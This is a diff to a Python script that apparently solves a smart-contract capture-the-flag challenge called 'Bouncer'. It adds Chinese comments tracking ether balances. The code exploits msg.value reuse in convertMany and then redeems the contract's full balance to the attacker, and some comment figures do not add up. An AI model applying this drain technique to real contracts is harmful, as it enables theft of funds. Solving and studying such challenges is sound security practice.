@@ -19,7 +19,6 @@ def deploy():
     ETH_CONST = "0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE"
 
     # 开始部署
-    # weth = WETH9.deploy({"from": deployer})
 
     setup_contract = SetupBouncer.deploy(
         {"from": deployer, "value": Web3.toWei(100, "ether")}
@@ -32,18 +31,24 @@ def attack():
     value = Web3.toWei(10, "ether")
     num_enters = 7
     print("Bouncer balance:", Web3.fromWei(bouncer_contract.balance(), "ether"))
+    # 部署完成后，合约共有：52 ether
+
+    # attacker 存入 7次，7个ether
     for _ in range(num_enters):
         tx = bouncer_contract.enter(
             ETH_CONST, value, {"from": attacker, "value": Web3.toWei(1, "ether")}
         )
         tx.wait(1)
     print("Bouncer balance:", Web3.fromWei(bouncer_contract.balance(), "ether"))
+    # 这时一共有59个ether
 
+    # 一共传入10个ether, 共执行7次convert函数，则可以累积到70个ether
     tx = bouncer_contract.convertMany(
         attacker, list(range(num_enters)), {"from": attacker, "value": value}
     )
     tx.wait(1)
     print("Bouncer balance:", Web3.fromWei(bouncer_contract.balance(), "ether"))
+    # 这时一共 67 个ether
     print()
     tx = bouncer_contract.redeem(
         ETH_CONST, bouncer_contract.balance(), {"from": attacker}
